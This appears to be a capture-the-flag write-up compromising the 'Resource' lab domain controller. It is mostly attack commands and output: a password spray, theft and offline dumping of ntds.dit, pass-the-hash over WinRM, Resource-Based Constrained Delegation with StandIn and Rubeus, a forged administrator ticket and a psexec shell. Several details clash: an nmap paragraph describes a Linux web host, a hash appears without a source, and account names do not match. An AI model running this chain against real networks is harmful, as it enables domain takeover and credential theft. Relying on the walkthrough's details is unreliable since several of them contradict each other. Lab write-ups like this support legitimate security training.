# Summary
This engagement targeted the 'Resource' Proving Grounds machine, a Windows Server 2019 Domain Controller for `resourced.local`. Initial access was gained via a password spray using a credential found in a user description, which led to the compromise of the `V.Ventz` account. This access allowed for the extraction of the AD database (`ntds.dit`) and registry hives from a network share, yielding the NTLM hash for `M.Mason`. This hash provided a foothold as `L.Livingstone` via WinRM, from which a Resource-Based Constrained Delegation attack was staged by creating a computer object, forging a Kerberos ticket for the domain administrator, and ultimately establishing a high-integrity shell on the domain controller, resulting in full domain compromise.


# NMAP

The comprehensive TCP port scan using aggressive service detection, default scripts, and OS fingerprinting revealed only two open ports on the target host 192.168.186.175. Port 22 is running OpenSSH 8.9p1 Ubuntu, and port 80 is running an Apache httpd 2.4.52 web server. The operating system detection strongly suggests the host is running a Linux kernel, likely Ubuntu. The scan explicitly filtered to show only open ports across the full TCP range.

```bash
sudo nmap -sC -sV -Pn -O -p 1-65535 192.168.186.175  --open 
```

The full port scan results confirm the target is an Active Directory Domain Controller for the domain `resourced.local`. The hostname is identified as `ResourceDC.resourced.local`. Key services include Kerberos on port 88, LDAP on ports 389 and 3268, SMB on port 445, and Microsoft RPC across multiple ports. The host is running Windows 10 or Windows Server 2019 based on the detected build 17763. Critical management services like WinRM on port 5985 and RDP on port 3389 are also accessible.

```bash
3/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-15 18:02:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-12-15T18:03:28+00:00
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Not valid before: 2025-12-14T17:59:33
|_Not valid after:  2026-06-15T17:59:33
|_ssl-date: 2025-12-15T18:04:08+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
```

The SMB enumeration confirmed the target is a domain controller named `RESOURCEDC` for the domain `resourced.local`. The operating system is identified as Windows 10 or Server 2019 Build 17763. SMB signing is enabled on the host, and the deprecated SMBv1 protocol is not supported.
```bash
nxc smb  192.168.186.175 
SMB         192.168.186.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False) 
```

The local hosts file was modified to add a static entry resolving the domain name `resourced.local` to the target IP address `192.168.186.175`. This configuration ensures proper name resolution for the target domain during testing.

```bash
sudo cat  /etc/hosts   
192.168.186.175  resourced.local
```

The enum4linux tool performed comprehensive enumeration of the target SMB service. It obtained the workgroup and domain name `RESOURCED`. The tool successfully enumerated local groups, including Administrators, Users, and Guests, as well as built-in domain groups such as Domain Admins, Domain Users, and Domain Computers. It also discovered several domain user accounts: `andrew`, `david`, `jane`, `john`, `mary`, `robert`, and the default `Administrator`. The enumeration confirmed the target is a domain controller and identified the operating system as Windows 10 / Server 2019 Build 17763.

```bash
enum4linux 192.168.186.175    
```

The RID cycling attack successfully enumerated additional domain user accounts via the SMB service, revealing the standard `krbtgt` service account and several users with descriptions indicating their roles. Notable accounts include `L.Livingstone` (SysAdmin), `V.Ventz` (New-hire), and `M.Mason` (Ex IT admin). The account `V.Ventz` has a descriptive password reminder in its comment field.

```bash
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain                                                 
index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant       Name: (null)    Desc: Linear Algebra and crypto god
index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg     Name: (null)    Desc: Blockchain expert
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson      Name: (null)    Desc: Networking specialist
index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen Name: (null)    Desc: Frontend Developer
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone  Name: (null)    Desc: SysAdmin
index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason        Name: (null)    Desc: Ex IT admin
index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker       Name: (null)    Desc: Backend Developer
index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson     Name: (null)    Desc: Database Admin
index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson      Name: (null)    Desc: Military Vet now cybersecurity specialist
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)    Desc: New-hired, reminder: HotelCalifornia194!
```

A list of usernames was programmatically extracted from the previous enumeration data and saved into a file named `users.txt` for subsequent credential-based attacks.

```bash
cat user.txt |  awk '{print $8}'>users.txt
```

A file named `password.txt` was examined and found to contain a single plaintext password: `HotelCalifornia194!`. This matches the password reminder discovered in the description for the domain user `V.Ventz`.

```bash
cat password.txt                             
HotelCalifornia194!
```

A password spraying attack was conducted against the SMB service using the compiled user list and the discovered password. The attack was successful, achieving a valid authentication for the user `V.Ventz` with the password `HotelCalifornia194!`. All other user accounts in the list failed to authenticate with this credential.

```bash
 netexec smb resourced.local  -u 'users.txt' -p 'password.txt'  --continue-on-success
SMB         192.168.186.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False) 
SMB         192.168.186.175 445    RESOURCEDC       [-] resourced.local\Administrator:HotelCalifornia194! STATUS_LOGON_FAILURE 
SMB         192.168.186.175 445    RESOURCEDC       [-] resourced.local\D.Durant:HotelCalifornia194! STATUS_LOGON_FAILURE 
SMB         192.168.186.175 445    RESOURCEDC       [-] resourced.local\G.Goldberg:HotelCalifornia194! STATUS_LOGON_FAILURE 
SMB         192.168.186.175 445    RESOURCEDC       [-] resourced.local\Guest:HotelCalifornia194! STATUS_LOGON_FAILURE 
SMB         192.168.186.175 445    RESOURCEDC       [-] resourced.local\J.Johnson:HotelCalifornia194! STATUS_LOGON_FAILURE 
SMB         192.168.186.175 445    RESOURCEDC       [-] resourced.local\K.Keen:HotelCalifornia194! STATUS_LOGON_FAILURE 
SMB         192.168.186.175 445    RESOURCEDC       [-] resourced.local\krbtgt:HotelCalifornia194! STATUS_LOGON_FAILURE 
SMB         192.168.186.175 445    RESOURCEDC       [-] resourced.local\L.Livingstone:HotelCalifornia194! STATUS_LOGON_FAILURE 
SMB         192.168.186.175 445    RESOURCEDC       [-] resourced.local\M.Mason:HotelCalifornia194! STATUS_LOGON_FAILURE 
SMB         192.168.186.175 445    RESOURCEDC       [-] resourced.local\P.Parker:HotelCalifornia194! STATUS_LOGON_FAILURE 
SMB         192.168.186.175 445    RESOURCEDC       [-] resourced.local\R.Robinson:HotelCalifornia194! STATUS_LOGON_FAILURE 
SMB         192.168.186.175 445    RESOURCEDC       [-] resourced.local\S.Swanson:HotelCalifornia194! STATUS_LOGON_FAILURE 
SMB         192.168.186.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 
```

Authenticated SMB share enumeration was performed using the compromised credentials for `V.Ventz`. The user has READ access to several shares, including the default administrative shares, the domain logon shares `NETLOGON` and `SYSVOL`, and a non-standard share named `Password Audit`.

```bash
netexec smb resourced.local  -u 'V.Ventz' -p 'HotelCalifornia194!' --shares                             
SMB         192.168.186.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False) 
SMB         192.168.186.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 
SMB         192.168.186.175 445    RESOURCEDC       [*] Enumerated shares
SMB         192.168.186.175 445    RESOURCEDC       Share           Permissions     Remark
SMB         192.168.186.175 445    RESOURCEDC       -----           -----------     ------
SMB         192.168.186.175 445    RESOURCEDC       ADMIN$                          Remote Admin
SMB         192.168.186.175 445    RESOURCEDC       C$                              Default share
SMB         192.168.186.175 445    RESOURCEDC       IPC$            READ            Remote IPC
SMB         192.168.186.175 445    RESOURCEDC       NETLOGON        READ            Logon server share 
SMB         192.168.186.175 445    RESOURCEDC       Password Audit  READ            
SMB         192.168.186.175 445    RESOURCEDC       SYSVOL          READ            Logon server share 
```

A critical database file, `ntds.dit`, was successfully downloaded from the `Password Audit` share via an authenticated SMB session. This file contains the Active Directory database, including password hashes for all domain users. The file was located in a subdirectory named `Active Directory`.

```bash
nxc smb 192.168.186.175 -u V.Ventz -p 'HotelCalifornia194!' -d resourced.local --timeout 120 --share 'Password Audit' --get-file 'Active Directory\\ntds.dit' ntds.dit
SMB         192.168.186.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False) 
SMB         192.168.186.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 
SMB         192.168.186.175 445    RESOURCEDC       [*] Copying "Active Directory\\ntds.dit" to "ntds.dit"
SMB         192.168.186.175 445    RESOURCEDC       [+] File "Active Directory\\ntds.dit" was downloaded to "ntds.dit"
                                                                                    
```

The companion `ntds.jfm` transaction log file was successfully downloaded from the same `Active Directory` directory on the `Password Audit` share. This file is required for the integrity of the offline `ntds.dit` database extraction process.

```bash
 nxc smb 192.168.186.175 -u V.Ventz -p 'HotelCalifornia194!' -d resourced.local --timeout 120 --share 'Password Audit' --get-file 'Active Directory\\ntds.jfm' ntds.jfm 
SMB         192.168.186.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False) 
SMB         192.168.186.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 
SMB         192.168.186.175 445    RESOURCEDC       [*] Copying "Active Directory\\ntds.jfm" to "ntds.jfm"
SMB         192.168.186.175 445    RESOURCEDC       [+] File "Active Directory\\ntds.jfm" was downloaded to "ntds.jfm"
```

The authenticated SMB client session recursively listed the contents of the `Password Audit` share, revealing a directory named `registry`. This directory contains two critical files: `SECURITY` and `SYSTEM`. These are registry hive files necessary for decrypting the `ntds.dit` database to extract credential hashes.

```bash
smbclient //192.168.186.175/'Password Audit' -U resourced.local/V.Ventz%'HotelCalifornia194!' -c 'recurse; dir registry'
  registry                            D        0  Tue Oct  5 08:49:16 2021

\registry
  .                                   D        0  Tue Oct  5 08:49:16 2021
  ..                                  D        0  Tue Oct  5 08:49:16 2021
  SECURITY                            A    65536  Mon Sep 27 10:45:20 2021
  SYSTEM                              A 16777216  Mon Sep 27 10:45:20 2021
```

The `SYSTEM` registry hive was downloaded via SMB from the `registry` subdirectory. This file contains the boot key required to decrypt the `ntds.dit` database.

```bash
 nxc smb 192.168.186.175 -u V.Ventz -p 'HotelCalifornia194!' -d resourced.local --timeout 120 --share 'Password Audit' --get-file 'registry/SYSTEM' SYSTEM
SMB         192.168.186.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False) 
SMB         192.168.186.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 
SMB         192.168.186.175 445    RESOURCEDC       [*] Copying "registry/SYSTEM" to "SYSTEM"
SMB         192.168.186.175 445    RESOURCEDC       [+] File "registry/SYSTEM" was downloaded to "SYSTEM"
                    
```

The `SECURITY` registry hive was downloaded via SMB from the `registry` subdirectory. This hive contains the credentials database and is essential for extracting the `ntds.dit` encryption keys.

```bash
nxc smb 192.168.186.175 -u V.Ventz -p 'HotelCalifornia194!' -d resourced.local --timeout 120 --share 'Password Audit' --get-file 'registry/SECURITY' SECURITY
SMB         192.168.186.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False) 
SMB         192.168.186.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 
SMB         192.168.186.175 445    RESOURCEDC       [*] Copying "registry/SECURITY" to "SECURITY"
SMB         192.168.186.175 445    RESOURCEDC       [+] File "registry/SECURITY" was downloaded to "SECURITY"

```

The `secretsdump.py` tool was used to perform an offline extraction of NTLM password hashes from the acquired `ntds.dit` file using the `SYSTEM` registry hive. The command successfully dumped the hashes for several accounts, including the Administrator, the machine account `RESOURCEDC$`, the `krbtgt` service account, and the domain user `M.Mason`. The hash for the `M.Mason` account was obtained in NTLM format.

```bash
secretsdump.py  -ntds ntds.dit -system SYSTEM LOCAL  

Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::


```

A pass-the-hash attack was conducted against the WinRM service using the previously dumped NTLM hash for the user `L.Livingstone`. The attack successfully authenticated, confirming that the compromised NTLM hash for `L.Livingstone` is valid for authentication via the WinRM protocol.

```bash
netexec winrm resourced.local  -u 'users.txt' -p 'hashes.txt'  --continue-on-success 

L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808

```

An interactive remote PowerShell session was established with the target host using the Evil-WinRM tool and the NTLM hash for the user `L.Livingstone`. The session achieved user-level access. A file named `local.txt` on the user's desktop was read, containing the value `6ac27ad2f368daabb93dfcbe4729d65d`.

```bash
evil-winrm -i   192.168.186.175  -u 'L.Livingstone' -H '19a3a7550ce8c505c2d46b5e39d6f808' 

*Evil-WinRM* PS C:\Users\L.Livingstone\Desktop> cat local.txt
6ac27ad2f368daabb93dfcbe4729d65d
```

BloodHound data was collected from the target domain via an authenticated LDAP session using the credentials for `V.Ventz`. All predefined data collection methods were executed. The collected data, including information on users, groups, computers, permissions, and trust relationships, was compressed into a zip file for analysis within the BloodHound tool.

```bash
netexec ldap 192.168.186.175  -u 'V.Ventz' -p 'HotelCalifornia194!' --bloodhound --dns-server 192.168.186.175  -c ALL --dns-tcp 
LDAP        192.168.186.175 389    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local)
LDAP        192.168.186.175 389    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 
LDAP        192.168.186.175 389    RESOURCEDC       Resolved collection methods: container, localadmin, group, trusts, objectprops, rdp, acl, dcom, psremote, session
LDAP        192.168.186.175 389    RESOURCEDC       Done in 00M 03S
LDAP        192.168.186.175 389    RESOURCEDC       Compressing output into /home/kali/.nxc/logs/RESOURCEDC_192.168.186.175_2025-12-15_182623_bloodhound.zip
```

The compressed BloodHound data collection file was copied from its original location in the NetExec logs directory to the current working directory for further analysis and processing.

```bash
cp -r   /home/kali/.nxc/logs/RESOURCEDC_192.168.186.175_2025-12-15_182623_bloodhound.zip .
```

The BloodHound CLI tool was executed to process and upload the collected zip file. This step ingests the collected domain relationships and objects into the Neo4j database, enabling graphical path analysis for privilege escalation and lateral movement opportunities.

```bash
./bloodhound-cli up
```

The file `resourced.png` appears to contain a graphic representation of the BloodHound analysis. It shows the domain `RESOURCED.LOCAL` and highlights the user `L.LIVINGSTONE@RESOURCED.LOCAL`. The analysis typically visualizes attack paths, such as privilege escalation, lateral movement, or domain compromise routes related to this account

![BloodHound Analysis](images/resourced.png)

The StandIn.exe tool was executed to create a new computer object named `FakeComputer02` within the domain. The attack successfully added the machine account to the `CN=Computers` container with an automatically generated password `JuzPwTZwRfiwnFo`. This demonstrates the ability to create unauthorized domain-joined computer accounts.

```bash
.\StandIn.exe --computer FakeComputer02 --make

[?] Using DC    : ResourceDC.resourced.local
    |_ Domain   : resourced.local
    |_ DN       : CN=FakeComputer02,CN=Computers,DC=resourced,DC=local
    |_ Password : JuzPwTZwRfiwnFo

[+] Machine account added to AD..

```

A PowerShell command was executed via the Evil-WinRM session to enumerate all computer objects in Active Directory. The output confirms the existence of the newly created `FakeComputer02` computer account alongside the legitimate domain controller `RESOURCEDC` and another computer named `CURE`. The Security Identifiers for each account are listed.

```bash
*Evil-WinRM* PS C:\ProgramData> Get-ADComputer -Filter * | Select-Object Name, SID

Name           SID
----           ---
RESOURCEDC     S-1-5-21-537427935-490066102-1511301751-1000
CURE           S-1-5-21-537427935-490066102-1511301751-4101
FakeComputer02 S-1-5-21-537427935-490066102-1511301751-4102
```

The StandIn.exe tool was executed to perform a Resource-Based Constrained Delegation attack. The command added the SID of the controlled computer account `FakeComputer02` to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the domain controller computer object `RESOURCEDC`. This configuration grants `FakeComputer02` the ability to impersonate any user to services running on the domain controller.

```bash
.\StandIn.exe --computer RESOURCEDC --sid S-1-5-21-537427935-490066102-1511301751-4102

[?] Using DC : ResourceDC.resourced.local
[?] Object   : CN=RESOURCEDC
    Path     : LDAP://CN=RESOURCEDC,OU=Domain Controllers,DC=resourced,DC=local
[+] SID added to msDS-AllowedToActOnBehalfOfOtherIdentity

```

A Python script named `convert_password_NTLM.py` was created to convert the plaintext password `JuzPwTZwRfiwnFo` into its corresponding NTLM hash. The script encodes the password in UTF-16LE format and then computes its MD4 hash, which is the algorithm used for NTLM.

```bash
cat convert_password_NTLM.py

import hashlib

password = "JuzPwTZwRfiwnFo"
password_bytes = password.encode("utf-16le")
md4_hash = hashlib.new("md4", password_bytes).digest()
ntlm_hash = md4_hash.hex()
print(ntlm_hash)
```

The script `convert_password_NTLM.py` was executed, successfully generating the NTLM hash `eb56e71d45007313b03a8777231d76f1` from the plaintext machine account password `JuzPwTZwRfiwnFo`. This hash is used for subsequent authentication steps in the attack chain.

```bash
python convert_password_NTLM.py
eb56e71d45007313b03a8777231d76f1 
```

The Rubeus.exe tool was executed to perform a constrained delegation attack via S4U2Self and S4U2Proxy. Using the NTLM hash of the `FakeComputer02` machine account, the tool requested a Kerberos Ticket-Granting Service ticket for the `administrator` user impersonated to the `cifs/resourcedc.resourced.local` service. The `/ptt` flag injected the resulting Ticket-Granting Ticket directly into the current session's memory, granting administrative access to the domain controller's file share service.

```bash
.\Rubeus.exe s4u /user:FakeComputer$ /rc4:eb56e71d45007313b03a8777231d76f1 /impersonateuser:administrator /msdsspn:cifs/resourcedc.resourced.local /domain:resourced.local /dc:192.168.186.175 /ptt
```

The Rubeus command executed successfully, as evidenced by the lengthy base64-encoded Kerberos ticket output. This ticket represents a forged Service Ticket for the `administrator` user to the `cifs/resourcedc.resourced.local` service. The `/ptt` argument has placed this ticket into memory for immediate use, enabling impersonation of the domain administrator to access the domain controller.

```bash
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
      b3VyY2VkLmxvY2Fs


```

The base64-encoded Kerberos ticket, stored in `ticket.kirbi.bs64`, was processed. Extraneous whitespace characters were removed, and the data was decoded from base64. The resulting binary ticket was saved to a new file named `ticket.kirbi`. This file contains the forged Kerberos service ticket for use with other tools.

```bash
cat ticket.kirbi.bs64 | tr -d ' \t\n\r' | base64 -d > ticket.kirbi
```

The Impacket script `ticketConverter.py` successfully converted the binary Kerberos ticket file `ticket.kirbi` into the `Administrator.ccache` file format. This CCache file is compatible with tools that use the MIT Kerberos credential cache for authentication, allowing the use of the forged administrator ticket.

```bash
ticketConverter.py ticket.kirbi Administrator.ccache

Impacket v0.13.0.dev0+20250528.4535.5b338613 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done

```

The `KRB5CCNAME` environment variable was set to point to the `./Administrator.ccache` file. This instructs Kerberos-aware tools, such as Impacket utilities, to use the forged administrator ticket stored in this credential cache for authentication, bypassing the need for a password or hash.

```bash
export KRB5CCNAME=./Administrator.ccache
```

The `klist` command was executed to list the Kerberos tickets in the cache. The output confirms the presence of a valid Service Ticket for the principal `administrator@RESOURCED.LOCAL`. The ticket is for the `cifs/resourcedc.resourced.local` service and is valid for approximately 10 hours, with a renewal period of one week. This confirms successful ticket injection and domain administrator impersonation.

```bash
klist
Ticket cache: FILE:./Administrator.ccache
Default principal: administrator@RESOURCED.LOCAL

Valid starting       Expires              Service principal
12/15/2025 23:36:12  12/16/2025 09:36:11  cifs/resourcedc.resourced.local@RESOURCED.LOCAL
        renew until 12/22/2025 23:36:11
                                        
```

The Impacket `psexec.py` tool was executed with Kerberos authentication, using the forged ticket in the cache. It successfully established a remote command shell as the domain administrator on the target domain controller `resourcedc.resourced.local`. The `proof.txt` file on the Administrator's desktop was accessed, confirming full domain compromise.

```bash
psexec.py -k -no-pass resourced.local/administrator@resourcedc.resourced.local -dc-ip 192.168.186.175 -target-ip 192.168.186.175


C:\Users\Administrator\Desktop> type proof.txt
414b9124add019e37d751bc2ae07fd59
```


